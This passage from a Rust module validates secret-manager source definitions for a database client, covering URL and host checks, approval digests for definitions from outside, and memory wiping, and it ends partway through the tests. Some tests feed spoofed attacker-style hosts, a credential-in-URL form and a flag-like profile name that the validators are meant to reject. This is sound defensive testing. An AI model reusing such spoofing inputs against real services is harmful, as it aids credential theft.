                    return Err(bad("el comando tiene que ser una sola línea"));
                }
            }
            Self::OnePassword { reference, account, .. } => {
                let r = reference.trim();
                if !r.starts_with("op://") || r.len() <= "op://".len() || !no_control(r) {
                    return Err(bad("la referencia de 1Password tiene que empezar con op:// (op://bóveda/elemento/campo)"));
                }
                if !account.is_empty() && (account.starts_with('-') || !account.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@'))) {
                    return Err(bad("la cuenta de 1Password no es válida"));
                }
            }
            Self::Vault { address, path, key, namespace, ca_file, auth, approle_mount, role_id, .. } => {
                check_vault_address(address)?;
                check_vault_auth(*auth, approle_mount, role_id)?;
                if path.trim().trim_matches('/').is_empty() || !no_control(path) || path.contains("..") || path.contains(['?', '#']) {
                    return Err(bad("falta la ruta del secreto en Vault (secret/miapp/db)"));
                }
                if key.trim().is_empty() {
                    return Err(bad("falta la clave del secreto de Vault (password)"));
                }
                if !namespace.is_empty() && !no_control(namespace) {
                    return Err(bad("el espacio de nombres de Vault no es válido"));
                }
                if !no_control(ca_file) {
                    return Err(bad("la ruta del certificado de la CA no es válida"));
                }
            }
            Self::Aws { secret_id, region, profile, .. } => {
                if secret_id.trim().is_empty() || !no_control(secret_id) {
                    return Err(bad("falta el nombre o el ARN del secreto de AWS"));
                }
                if !region.trim().is_empty() && !valid_aws_region(region.trim()) {
                    return Err(bad(format!("la región de AWS «{}» no es válida", region.trim())));
                }
                if !profile.is_empty() && (profile.starts_with('-') || !profile.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@' | '+'))) {
                    return Err(bad("el perfil de AWS no es válido"));
                }
            }
            Self::Azure { vault_url, name, version, tenant, .. } => {
                if !tenant.is_empty() && !valid_azure_tenant(tenant) {
                    return Err(bad("el inquilino de Microsoft Entra no es válido (su ID o su dominio)"));
                }
                if azure_vault_host(vault_url).is_none() {
                    return Err(bad("la URL del almacén tiene que ser https://<nombre>.vault.azure.net"));
                }
                if !url_segment(name.trim()) || name.contains(['.', ':']) {
                    return Err(bad("el nombre del secreto de Azure Key Vault no es válido"));
                }
                if !version.trim().is_empty() && !version.trim().chars().all(|c| c.is_ascii_alphanumeric()) {
                    return Err(bad("la versión del secreto de Azure Key Vault no es válida"));
                }
            }
            Self::Gcp { project, secret, version, account, .. } => {
                if !url_segment(project.trim()) {
                    return Err(bad("falta el proyecto de Google Cloud (o no es válido)"));
                }
                if !account.is_empty() && !valid_gcloud_account(account) {
                    return Err(bad("la cuenta de gcloud tiene que ser un correo (ana@example.com)"));
                }
                if !url_segment(secret.trim()) || secret.contains([':', '.']) {
                    return Err(bad("falta el nombre del secreto de Google Secret Manager (o no es válido)"));
                }
                let v = version.trim();
                if !v.is_empty() && v != "latest" && !v.chars().all(|c| c.is_ascii_digit()) {
                    return Err(bad("la versión del secreto de Google tiene que ser un número o latest"));
                }
            }
            Self::KeePass { file, entry, attribute, key_file, master, master_command, .. } => {
                if file.trim().is_empty() || !no_control(file) {
                    return Err(bad("falta el archivo de la base de KeePass (.kdbx)"));
                }
                if entry.trim().is_empty() || !no_control(entry) {
                    return Err(bad("falta la entrada de KeePass (Grupo/Subgrupo/Título o su UUID)"));
                }
                if !no_control(attribute) {
                    return Err(bad("el campo de la entrada de KeePass no es válido"));
                }
                if !no_control(key_file) {
                    return Err(bad("la ruta del archivo de clave no es válida"));
                }
                if *master == MasterSource::None && key_file.trim().is_empty() {
                    return Err(bad("sin contraseña maestra, la base de KeePass necesita un archivo de clave"));
                }
                check_master_command(*master, master_command)?;
            }
            Self::Zoho { data_center, secret_name, attribute, client_id, master, master_command, account, .. } if !account.is_empty() => {
                if !crate::secret_accounts::valid_account_id(account) {
                    return Err(bad("la cuenta de Zoho Vault no es válida"));
                }
                // The sign-in and the passphrase are the account's.
                if !data_center.is_empty() || !client_id.is_empty() || *master != MasterSource::Keychain || !master_command.is_empty() {
                    return Err(bad("con una cuenta de Zoho Vault, el centro de datos, el cliente y la frase son los de la cuenta"));
                }
                if secret_name.trim().is_empty() || secret_name.len() > 255 || !no_control(secret_name) {
                    return Err(bad("falta el nombre o el ID del secreto de Zoho Vault"));
                }
                if !no_control(attribute) {
                    return Err(bad("el campo del secreto de Zoho Vault no es válido"));
                }
            }
            Self::Zoho { data_center, secret_name, attribute, client_id, master, master_command, .. } => {
                if zoho_hosts(data_center).is_none() {
                    return Err(bad(format!("el centro de datos de Zoho «{}» no es válido", data_center.trim())));
                }
                if secret_name.trim().is_empty() || secret_name.len() > 255 || !no_control(secret_name) {
                    return Err(bad("falta el nombre o el ID del secreto de Zoho Vault"));
                }
                if !no_control(attribute) {
                    return Err(bad("el campo del secreto de Zoho Vault no es válido"));
                }
                let id = client_id.trim();
                if id.is_empty() || id.len() > 200 || !id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_')) {
                    return Err(bad("falta el ID del cliente de Zoho (1000.XXXX)"));
                }
                if *master == MasterSource::None {
                    return Err(bad("Zoho Vault necesita la frase de contraseña maestra"));
                }
                check_master_command(*master, master_command)?;
            }
            Self::VaultDb { address, mount, role, namespace, ca_file, auth, approle_mount, role_id, .. } => {
                check_vault_address(address)?;
                if !mount.is_empty() && !vault_path(mount) {
                    return Err(bad("el punto de montaje del motor de bases de datos de Vault no es válido (database)"));
                }
                if !url_segment(role.trim()) || role.contains(':') {
                    return Err(bad("falta el rol de Vault (o no es válido)"));
                }
                if !namespace.is_empty() && !no_control(namespace) {
                    return Err(bad("el espacio de nombres de Vault no es válido"));
                }
                if !no_control(ca_file) {
                    return Err(bad("la ruta del certificado de la CA no es válida"));
                }
                check_vault_auth(*auth, approle_mount, role_id)?;
            }
            Self::Conjur { url, account, login, variable, username_variable, ca_file, .. } => {
                if service_url(url).is_none() {
                    return Err(bad("la URL de Conjur tiene que ser https:// (http:// solo para esta computadora)"));
                }
                if account.trim().is_empty() || account.len() > 255 || !no_control(account) || account.contains(['/', '?', '#']) {
                    return Err(bad("falta la cuenta de Conjur (o no es válida)"));
                }
                if login.trim().is_empty() || login.len() > 1024 || !no_control(login) {
                    return Err(bad("falta el login de Conjur (host/<id> o un usuario)"));
                }
                for v in [variable, username_variable] {
                    if v.len() > 1024 || !no_control(v) {
                        return Err(bad("el ID de la variable de Conjur no es válido"));
                    }
                }
                if variable.trim().is_empty() {
                    return Err(bad("falta el ID de la variable de Conjur"));
                }
                if !no_control(ca_file) {
                    return Err(bad("la ruta del certificado de la CA no es válida"));
                }
            }
            Self::Ccp { url, app_id, safe, folder, object, account_user, account_address, client_cert, client_key, ca_file, .. } => {
                if service_url(url).is_none() {
                    return Err(bad("la URL del Central Credential Provider tiene que ser https:// (http:// solo para esta computadora)"));
                }
                if app_id.trim().is_empty() {
                    return Err(bad("falta el AppID del Central Credential Provider"));
                }
                for v in [app_id, safe, folder, object, account_user, account_address, client_cert, client_key, ca_file] {
                    if v.len() > 1024 || !no_control(v) {
                        return Err(bad("un dato del Central Credential Provider no es válido"));
                    }
                }
                if object.trim().is_empty() && account_user.trim().is_empty() && account_address.trim().is_empty() {
                    return Err(bad("falta qué cuenta pedir al Central Credential Provider: el objeto, o el usuario o la dirección"));
                }
                if client_cert.trim().is_empty() && !client_key.trim().is_empty() {
                    return Err(bad("la clave privada necesita su certificado de cliente"));
                }
            }
            Self::Delinea { url, platform_url, username, domain, secret_name, attribute, master, master_command, .. } => {
                if service_url(url).is_none() {
                    return Err(bad("la URL de Secret Server tiene que ser https:// (http:// solo para esta computadora)"));
                }
                if !platform_url.trim().is_empty() && delinea_platform_host(platform_url).is_none() {
                    return Err(bad("la URL de Delinea Platform tiene que ser https://<inquilino>.delinea.app"));
                }
                if username.trim().is_empty() || username.len() > 255 || !no_control(username) {
                    return Err(bad("falta el usuario de Delinea (o el ID del cliente en Delinea Platform)"));
                }
                if domain.len() > 255 || !no_control(domain) {
                    return Err(bad("el dominio de Delinea no es válido"));
                }
                if secret_name.trim().is_empty() || secret_name.len() > 255 || !no_control(secret_name) {
                    return Err(bad("falta el ID o el nombre del secreto de Delinea"));
                }
                if attribute.len() > 255 || !no_control(attribute) {
                    return Err(bad("el campo del secreto de Delinea no es válido"));
                }
                if *master == MasterSource::None {
                    return Err(bad("Delinea necesita la contraseña (o el secreto del cliente)"));
                }
                check_master_command(*master, master_command)?;
            }
            Self::Bitwarden { server, item, attribute, client_id, master, master_command, .. } => {
                check_bitwarden_server(server)?;
                if item.trim().is_empty() || item.len() > 500 || !no_control(item) {
                    return Err(bad("falta el ID o el nombre del elemento de Bitwarden"));
                }
                if !no_control(attribute) {
                    return Err(bad("el campo del elemento de Bitwarden no es válido"));
                }
                let id = client_id.trim().strip_prefix("user.").unwrap_or("");
                if !is_uuid(id) {
                    return Err(bad("falta el client_id de la clave de API de Bitwarden (user.xxxxxxxx-…)"));
                }
                if *master == MasterSource::None {
                    return Err(bad("Bitwarden necesita la contraseña maestra"));
                }
                check_master_command(*master, master_command)?;
            }
            Self::BitwardenSm { server, secret, .. } => {
                check_bitwarden_server(server)?;
                if !is_uuid(secret.trim()) {
                    return Err(bad("falta el ID del secreto de Bitwarden Secrets Manager (un UUID)"));
                }
            }
            Self::Ssm { parameter, version, region, profile, list_index, .. } => {
                if !valid_ssm_parameter(parameter.trim()) {
                    return Err(bad("falta el nombre o el ARN del parámetro de AWS (/prod/db/password)"));
                }
                let v = version.trim();
                if !v.is_empty() && (v.len() > 100 || !v.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))) {
                    return Err(bad("la versión del parámetro tiene que ser un número o una etiqueta"));
                }
                if !region.trim().is_empty() && !valid_aws_region(region.trim()) {
                    return Err(bad(format!("la región de AWS «{}» no es válida", region.trim())));
                }
                if !profile.is_empty() && (profile.starts_with('-') || !profile.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | '@' | '+'))) {
                    return Err(bad("el perfil de AWS no es válido"));
                }
                let i = list_index.trim();
                if !i.is_empty() && !i.parse::<usize>().is_ok_and(|n| (1..=10_000).contains(&n)) {
                    return Err(bad("el elemento de la lista tiene que ser un número desde 1"));
                }
            }
        }
        Ok(())
    }
}

/// `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` (any case).
pub fn is_uuid(s: &str) -> bool {
    s.len() == 36 && s.char_indices().all(|(i, c)| if matches!(i, 8 | 13 | 18 | 23) { c == '-' } else { c.is_ascii_hexdigit() })
}

/// Bitwarden's US and EU clouds: `(name, identity URL, API URL)`.
pub const BITWARDEN_CLOUDS: &[(&str, &str, &str)] = &[
    ("bitwarden.com", "https://identity.bitwarden.com", "https://api.bitwarden.com"),
    ("bitwarden.eu", "https://identity.bitwarden.eu", "https://api.bitwarden.eu"),
];

/// The identity and API base URLs of a Bitwarden server: `bitwarden.com`
/// (also empty) or `bitwarden.eu`, else a self-hosted server's URL
/// (`https://host[:port][/path]`, whose `/identity` and `/api` are used).
/// Plain `http://` only for this computer (`localhost`, `127.x`, `[::1]`).
/// No credentials, query or fragment: tokens only go to that origin.
pub fn bitwarden_urls(server: &str) -> Option<(String, String)> {
    let s = server.trim().trim_end_matches('/');
    let cloud = |name: &str| BITWARDEN_CLOUDS.iter().find(|(n, _, _)| *n == name).map(|(_, i, a)| (i.to_string(), a.to_string()));
    match s.to_ascii_lowercase().as_str() {
        "" | "bitwarden.com" | "https://vault.bitwarden.com" => return cloud("bitwarden.com"),
        "bitwarden.eu" | "https://vault.bitwarden.eu" => return cloud("bitwarden.eu"),
        _ => {}
    }
    let (https, rest) = match (s.strip_prefix("https://"), s.strip_prefix("http://")) {
        (Some(r), _) => (true, r),
        (_, Some(r)) => (false, r),
        _ => return None,
    };
    let (authority, path) = rest.split_at(rest.find('/').unwrap_or(rest.len()));
    let (host, port) = match authority.strip_prefix('[') {
        Some(v6) => {
            let (h, after) = v6.split_once(']')?;
            (h, if after.is_empty() { None } else { Some(after.strip_prefix(':')?) })
        }
        None => match authority.split_once(':') {
            Some((h, p)) => (h, Some(p)),
            None => (authority, None),
        },
    };
    let host_ok = !host.is_empty()
        && host.len() <= 253
        && if authority.starts_with('[') { host.chars().all(|c| c.is_ascii_hexdigit() || c == ':') } else { host.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.') };
    let port_ok = port.is_none_or(|p| !p.is_empty() && p.len() <= 5 && p.chars().all(|c| c.is_ascii_digit()));
    let path_ok = path.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '-' | '_' | '.' | '~')) && !path.contains("//") && !path.split('/').any(|seg| seg == "..");
    if !host_ok || !port_ok || !path_ok {
        return None;
    }
    let h = host.to_ascii_lowercase();
    let local = h == "localhost" || h == "::1" || (h.starts_with("127.") && h.split('.').count() == 4 && h.split('.').all(|o| o.parse::<u8>().is_ok()));
    if !https && !local {
        return None;
    }
    let base = format!("{}://{}{}", if https { "https" } else { "http" }, authority.to_ascii_lowercase(), path);
    Some((format!("{base}/identity"), format!("{base}/api")))
}

pub(crate) fn check_bitwarden_server(server: &str) -> Result<()> {
    if bitwarden_urls(server).is_none() {
        return Err(bad("el servidor de Bitwarden tiene que ser bitwarden.com, bitwarden.eu o la URL https:// del servidor propio"));
    }
    Ok(())
}

/// `/prod/db/password`, `db-password`, or its ARN
/// (`arn:aws:ssm:<region>:<account>:parameter/…`).
pub fn valid_ssm_parameter(p: &str) -> bool {
    let name_ok = |n: &str| !n.is_empty() && n.len() <= 2048 && n.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-' | '/')) && !n.contains("//");
    match p.strip_prefix("arn:") {
        Some(rest) => {
            let parts: Vec<&str> = rest.splitn(5, ':').collect();
            parts.len() == 5
                && parts[0].starts_with("aws")
                && parts[1] == "ssm"
                && valid_aws_region(parts[2])
                && parts[3].len() == 12
                && parts[3].chars().all(|c| c.is_ascii_digit())
                && parts[4].strip_prefix("parameter").is_some_and(|n| n.starts_with('/') && name_ok(n))
        }
        None => name_ok(p),
    }
}

pub(crate) fn check_master_command(master: MasterSource, command: &str) -> Result<()> {
    if master == MasterSource::Command {
        if command.trim().is_empty() {
            return Err(bad("falta el comando que devuelve la contraseña maestra"));
        }
        if command.contains('\0') || command.contains(['\n', '\r']) {
            return Err(bad("el comando tiene que ser una sola línea"));
        }
    }
    Ok(())
}

/// The definitions in a config's options (none if absent).
pub fn read(cfg: &ConnectionConfig) -> Result<SecretSources> {
    match cfg.options.get(OPTION).map(|s| s.trim()).filter(|s| !s.is_empty()) {
        Some(json) => serde_json::from_str(json).map_err(|e| bad(format!("los orígenes de los secretos no se pudieron leer: {e}"))),
        None => Ok(SecretSources::new()),
    }
}

/// The definitions, taken out of the options: the driver never sees them.
pub fn take(cfg: &mut ConnectionConfig) -> Result<SecretSources> {
    let out = read(cfg);
    cfg.options.remove(OPTION);
    out
}

/// Store `sources` in the options (removed when empty).
pub fn write(cfg: &mut ConnectionConfig, sources: &SecretSources) {
    if sources.is_empty() {
        cfg.options.remove(OPTION);
    } else if let Ok(json) = serde_json::to_string(sources) {
        cfg.options.insert(OPTION.into(), json);
    }
}

/// The definition as the connection form writes it back: every string
/// trimmed, and the inputs that do nothing left out (the user's field
/// without "fill the user", the master command without `master: command`,
/// the client key without a certificate, what only the password takes on
/// another field, Zoho's, Delinea's and Bitwarden's `master: none`, which
/// the form reads as the keychain). Definitions are compared, and
/// confirmations bound, in this form, so the form's normalization never
/// turns a definition that came from outside into a new one.
pub fn canonical(field: &str, source: &SecretSource) -> SecretSource {
    use serde_json::Value;
    let Ok(Value::Object(mut m)) = serde_json::to_value(source) else { return source.clone() };
    for v in m.values_mut() {
        if let Value::String(s) = v {
            let t = s.trim();
            if t.len() != s.len() {
                *s = t.to_string();
            }
        }
    }
    let text = |m: &serde_json::Map<String, Value>, k: &str| m.get(k).and_then(Value::as_str).unwrap_or("").to_string();
    if field != "password" {
        for k in ["fill_username", "user_field", "username_variable"] {
            m.remove(k);
        }
    }
    if m.get("fill_username").and_then(Value::as_bool) != Some(true) {
        m.remove("user_field");
    }
    if text(&m, "master") != "command" {
        m.remove("master_command");
    }
    if text(&m, "master") == "none" && matches!(source, SecretSource::Zoho { .. } | SecretSource::Delinea { .. } | SecretSource::Bitwarden { .. }) {
        m.remove("master");
    }
    if text(&m, "client_cert").is_empty() {
        m.remove("client_key");
    }
    serde_json::from_value(Value::Object(m)).unwrap_or_else(|_| source.clone())
}

/// What a confirmation is bound to: the connection, the field and the
/// definition in its [`canonical`] form. Hex SHA-256.
pub fn digest(connection_id: &str, field: &str, source: &SecretSource) -> String {
    let def = serde_json::to_string(&canonical(field, source)).unwrap_or_default();
    let mut h = Sha256::new();
    for part in ["dbine-secret-source-v1", connection_id, field, def.as_str()] {
        h.update((part.len() as u64).to_le_bytes());
        h.update(part.as_bytes());
    }
    hex::encode(h.finalize())
}

// ---- confirmations ---------------------------------------------------------

const APPROVALS_FILE: &str = "secret-source-approvals.json";

#[derive(Default, Serialize, Deserialize)]
struct ApprovalsFile {
    #[serde(default)]
    approved: BTreeSet<String>,
}

/// The confirmations: the file next to the state (loaded once), or memory
/// only when there's no state folder (tests, tools).
struct Approvals {
    path: Option<PathBuf>,
    set: BTreeSet<String>,
}

static APPROVALS: Mutex<Option<Approvals>> = Mutex::new(None);

fn with_approvals<T>(f: impl FnOnce(&mut Approvals) -> T) -> T {
    let mut guard = APPROVALS.lock().unwrap_or_else(|e| e.into_inner());
    let a = guard.get_or_insert_with(|| {
        let path = crate::secrets::vault_dir().map(|d| d.join(APPROVALS_FILE));
        let set = path
            .as_ref()
            .and_then(|p| std::fs::read_to_string(p).ok())
            .and_then(|t| serde_json::from_str::<ApprovalsFile>(&t).ok())
            .map(|f| f.approved)
            .unwrap_or_default();
        Approvals { path, set }
    });
    f(a)
}

fn save(a: &Approvals) -> Result<()> {
    let Some(path) = &a.path else { return Ok(()) };
    let json = serde_json::to_vec_pretty(&ApprovalsFile { approved: a.set.clone() })?;
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, json)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
    }
    std::fs::rename(&tmp, path)?;
    Ok(())
}

pub fn is_approved(digest: &str) -> bool {
    with_approvals(|a| a.set.contains(digest))
}

pub fn approve(digest: &str) -> Result<()> {
    with_approvals(|a| if a.set.insert(digest.to_string()) { save(a) } else { Ok(()) })
}

/// Forget confirmations (a deleted connection's).
pub fn forget(digests: &[String]) -> Result<()> {
    with_approvals(|a| {
        let before = a.set.len();
        for d in digests {
            a.set.remove(d);
        }
        if a.set.len() != before { save(a) } else { Ok(()) }
    })
}

/// A connection's stored definitions entry by entry: an entry that doesn't
/// parse is `None` (unreadable). `Err` when the option isn't even a JSON
/// object: unreadable on every field.
fn stored_entries(cfg: &ConnectionConfig) -> std::result::Result<BTreeMap<String, Option<SecretSource>>, ()> {
    let Some(json) = cfg.options.get(OPTION).map(|s| s.trim()).filter(|s| !s.is_empty()) else { return Ok(BTreeMap::new()) };
    let map: serde_json::Map<String, serde_json::Value> = serde_json::from_str(json).map_err(|_| ())?;
    Ok(map.into_iter().map(|(k, v)| (k, serde_json::from_value(v).ok())).collect())
}

/// Whether a definition is one that came from outside: some saved
/// connection has it (in its [`canonical`] form) on the same field and it
/// was never confirmed there, or has something there that can't be read
/// (it can't be told apart, so it counts as one). A definition nobody has
/// (typed in the form now) didn't.
pub fn from_outside(saved: &[SavedConnection], field: &str, source: &SecretSource) -> bool {
    let wanted = canonical(field, source);
    saved.iter().any(|c| match stored_entries(&c.config) {
        Err(()) => true,
        Ok(entries) => match entries.get(field) {
            None => false,
            Some(None) => true,
            Some(Some(s)) => canonical(field, s) == wanted && !is_approved(&digest(&c.id, field, s)),
        },
    })
}

/// Whether the form's definition for `field` needs the user's confirmation
/// before it runs or is saved as confirmed. While the connection being
/// edited (`editing`) has an unconfirmed or unreadable definition on that
/// field, whatever the form sends does: the form rewrites what it loads, so
/// its text can't tell an untouched outside definition from a new one.
/// Otherwise, a definition that came from outside ([`from_outside`]) does.
pub fn needs_confirmation(saved: &[SavedConnection], editing: Option<&str>, field: &str, source: &SecretSource) -> bool {
    if let Some(c) = editing.filter(|i| !i.is_empty()).and_then(|id| saved.iter().find(|c| c.id == id)) {
        let unconfirmed = match stored_entries(&c.config) {
            Err(()) => true,
            Ok(entries) => match entries.get(field) {
                None => false,
                Some(None) => true,
                Some(Some(s)) => !is_approved(&digest(&c.id, field, s)),
            },
        };
        if unconfirmed {
            return true;
        }
    }
    from_outside(saved, field, source)
}

// ---- values ----------------------------------------------------------------

/// The secret, or the `key` of it when it's a JSON object. Strings are
/// taken as they are; numbers and booleans as written.
pub fn pick_json(value: &str, key: &str) -> Result<String> {
    if key.is_empty() {
        return Ok(value.to_string());
    }
    let json: serde_json::Value = serde_json::from_str(value.trim()).map_err(|_| bad(format!("el secreto no es un objeto JSON, así que no tiene la clave «{key}»")))?;
    let obj = json.as_object().ok_or_else(|| bad(format!("el secreto no es un objeto JSON, así que no tiene la clave «{key}»")))?;
    match obj.get(key) {
        Some(serde_json::Value::String(s)) => Ok(s.clone()),
        Some(v @ (serde_json::Value::Number(_) | serde_json::Value::Bool(_))) => Ok(v.to_string()),
        Some(_) => Err(bad(format!("la clave «{key}» del secreto no es un texto"))),
        None => {
            let mut keys: Vec<&str> = obj.keys().map(String::as_str).take(20).collect();
            keys.sort_unstable();
            Err(bad(format!("el secreto no tiene la clave «{key}» (tiene: {})", keys.join(", "))))
        }
    }
}

/// Overwrite a string's bytes and empty it (best effort: copies made
/// earlier, by a reallocation or a parser, aren't reached).
pub fn wipe(s: &mut String) {
    // SAFETY: zero bytes are valid UTF-8.
    for b in unsafe { s.as_bytes_mut() } {
        unsafe { std::ptr::write_volatile(b, 0) };
    }
    s.clear();
}

/// The same for bytes.
pub fn wipe_bytes(v: &mut Vec<u8>) {
    for b in v.iter_mut() {
        unsafe { std::ptr::write_volatile(b, 0) };
    }
    v.clear();
}

// ---- Vault sign-in, service URLs ------------------------------------------

/// How DBine signs in to HashiCorp Vault.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VaultAuth {
    /// A token: the one kept for the field, `VAULT_TOKEN`, `~/.vault-token`.
    #[default]
    Token,
    /// AppRole: the role ID in the definition, the secret ID in the keychain.
    Approle,
}

fn is_token_auth(a: &VaultAuth) -> bool {
    *a == VaultAuth::Token
}

fn check_vault_address(address: &str) -> Result<()> {
    let a = address.trim();
    let rest = a.strip_prefix("https://").or_else(|| a.strip_prefix("http://"));
    if rest.is_none_or(|r| r.is_empty() || r.contains(['@', '?', '#']) || r.chars().any(char::is_control) || r.contains(char::is_whitespace)) {
        return Err(bad("la dirección de Vault tiene que ser una URL http:// o https:// (https://vault.ejemplo.com:8200)"));
    }
    Ok(())
}

/// A Vault mount: segments of letters, digits, `-`, `_`, `.`.
pub(crate) fn vault_path(p: &str) -> bool {
    let p = p.trim().trim_matches('/');
    !p.is_empty() && p.len() <= 255 && p.split('/').all(|s| !s.is_empty() && s != "." && s != ".." && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
}

pub(crate) fn check_vault_auth(auth: VaultAuth, mount: &str, role_id: &str) -> Result<()> {
    if auth == VaultAuth::Approle {
        if !mount.is_empty() && !vault_path(mount) {
            return Err(bad("el punto de montaje de AppRole no es válido (approle)"));
        }
        if role_id.trim().is_empty() || role_id.len() > 255 || role_id.chars().any(char::is_control) {
            return Err(bad("falta el role_id de AppRole"));
        }
    }
    Ok(())
}

/// Whether a host is this computer (`localhost`, `127.x.x.x`, `::1`).
pub fn is_loopback_host(host: &str) -> bool {
    let h = host.trim_start_matches('[').trim_end_matches(']').to_ascii_lowercase();
    h == "localhost" || h == "::1" || h.parse::<std::net::Ipv4Addr>().is_ok_and(|ip| ip.is_loopback())
}

/// A service's base URL: `https://host[:port][/path]`, or `http://` only to
/// this computer. No credentials, query or fragment. `(https, host)`.
pub fn service_url(url: &str) -> Option<(bool, String)> {
    let u = url.trim();
    let (https, rest) = match (u.strip_prefix("https://"), u.strip_prefix("http://")) {
        (Some(r), _) => (true, r),
        (_, Some(r)) => (false, r),
        _ => return None,
    };
    if rest.is_empty() || rest.contains(['@', '?', '#', '\\']) || rest.chars().any(|c| c.is_control() || c.is_whitespace()) || rest.contains("/../") || rest.ends_with("/..") {
        return None;
    }
    let authority = rest.split('/').next().unwrap_or("");
    let host = if let Some(v6) = authority.strip_prefix('[') {
        format!("[{}]", v6.split(']').next()?)
    } else {
        authority.split(':').next().unwrap_or("").to_string()
    };
    if host.is_empty() || !host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '[' | ']' | ':')) {
        return None;
    }
    if !https && !is_loopback_host(&host) {
        return None;
    }
    Some((https, host.to_ascii_lowercase()))
}

/// `https://<tenant>.delinea.app` (no path): the tenant's host.
pub fn delinea_platform_host(url: &str) -> Option<String> {
    let host = url.trim().strip_prefix("https://")?.trim_end_matches('/').to_ascii_lowercase();
    let tenant = host.strip_suffix(".delinea.app")?;
    (!tenant.is_empty() && tenant.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')).then_some(host)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmd(c: &str) -> SecretSource {
        SecretSource::Command { command: c.into(), json_key: String::new() }
    }

    #[test]
    fn definitions_round_trip_through_the_options() {
        let mut cfg = ConnectionConfig::default();
        let mut s = SecretSources::new();
        s.insert("password".into(), cmd("pass show db/prod"));
        s.insert(
            "ssh.password".into(),
            SecretSource::Vault {
                address: "https://vault:8200".into(),
                path: "secret/app".into(),
                key: "ssh".into(),
                namespace: String::new(),
                kv_version: KvVersion::V2,
                ca_file: String::new(),
                auth: VaultAuth::Token,
                approle_mount: String::new(),
                role_id: String::new(),
                secret_account: String::new(),
            },
        );
        write(&mut cfg, &s);
        assert!(cfg.options[OPTION].contains("\"kind\":\"command\""));
        assert!(cfg.options[OPTION].contains("\"kv_version\":\"2\""));
        assert_eq!(read(&cfg).unwrap(), s);
        assert_eq!(take(&mut cfg).unwrap(), s);
        assert!(!cfg.options.contains_key(OPTION), "the driver never gets them");
        write(&mut cfg, &SecretSources::new());
        assert!(!cfg.options.contains_key(OPTION));
    }

    /// A definition saved before `user_field` reads back the same and
    /// writes the same JSON, so its confirmation stays valid.
    #[test]
    fn user_field_keeps_old_definitions() {
        let old = r#"{"kind":"keepass","file":"~/db.kdbx","entry":"pg","fill_username":true}"#;
        let src: SecretSource = serde_json::from_str(old).unwrap();
        assert_eq!(serde_json::to_string(&src).unwrap(), old);
        assert_eq!(src.user_field(), "");
        let with: SecretSource = serde_json::from_str(r#"{"kind":"bitwarden","item":"pg","client_id":"user.x","fill_username":true,"user_field":"Login"}"#).unwrap();
        assert_eq!(with.user_field(), "Login");
        let bad: SecretSource = serde_json::from_str(r#"{"kind":"keepass","file":"f","entry":"e","user_field":"a\nb"}"#).unwrap();
        assert!(bad.validate().is_err());
    }

    #[test]
    fn every_kind_parses_from_its_json() {
        let json = r#"{
            "a": {"kind":"command","command":"echo hi"},
            "b": {"kind":"onepassword","reference":"op://Private/DB/password"},
            "c": {"kind":"vault","address":"http://127.0.0.1:8200","path":"secret/x","key":"pw"},
            "d": {"kind":"aws","secret_id":"prod/db","region":"us-east-1","json_key":"password","fill_username":true},
            "e": {"kind":"azure","vault_url":"https://kv1.vault.azure.net","name":"db-pw"},
            "f": {"kind":"gcp","project":"my-proj","secret":"db-pw"},
            "g": {"kind":"keepass","file":"~/db.kdbx","entry":"Databases/Prod/pg-main","key_file":"~/db.keyx","master":"ask","fill_username":true},
            "h": {"kind":"zoho","data_center":"eu","secret_name":"pg-main","client_id":"1000.ABC","master":"command","master_command":"pass show zoho"}
        }"#;
        let mut cfg = ConnectionConfig::default();
        cfg.options.insert(OPTION.into(), json.into());
        let s = read(&cfg).unwrap();
        assert_eq!(s.len(), 8);
        assert_eq!(s["g"].master(), Some(MasterSource::Ask));
        assert_eq!(s["h"].kind(), "zoho");
        for (k, v) in &s {
            v.validate().unwrap_or_else(|e| panic!("{k}: {e}"));
        }
        assert_eq!(s["d"].json_key(), "password");
        assert!(matches!(s["c"], SecretSource::Vault { kv_version: KvVersion::Auto, .. }));
    }

    #[test]
    fn validation_says_what_is_wrong() {
        assert!(cmd("  ").validate().is_err());
        assert!(cmd("a\nb").validate().is_err());
        let op = |r: &str| SecretSource::OnePassword { reference: r.into(), account: String::new(), json_key: String::new(), fill_username: false, user_field: String::new(), secret_account: String::new() };
        assert!(op("Private/DB/password").validate().is_err());
        assert!(op("op://Private Vault/DB/password").validate().is_ok(), "names with spaces are fine");
        let az = |u: &str| SecretSource::Azure { vault_url: u.into(), name: "pw".into(), version: String::new(), json_key: String::new(), secret_account: String::new(), tenant: String::new() };
        assert!(az("https://kv1.vault.azure.net/").validate().is_ok());
        for u in ["http://kv1.vault.azure.net", "https://evil.example.com", "https://kv1.vault.azure.net.evil.com", "https://a@kv1.vault.azure.net", "https://.vault.azure.net"] {
            assert!(az(u).validate().is_err(), "{u}");
        }
        let aws = |r: &str| SecretSource::Aws { secret_id: "x".into(), region: r.into(), profile: String::new(), json_key: String::new(), fill_username: false, secret_account: String::new() };
        assert!(aws("eu-west-1").validate().is_ok());
        let profile = SecretSource::Aws { secret_id: "x".into(), region: String::new(), profile: "--debug".into(), json_key: String::new(), fill_username: false, secret_account: String::new() };
        assert!(profile.validate().is_err(), "nothing that reads as a flag");
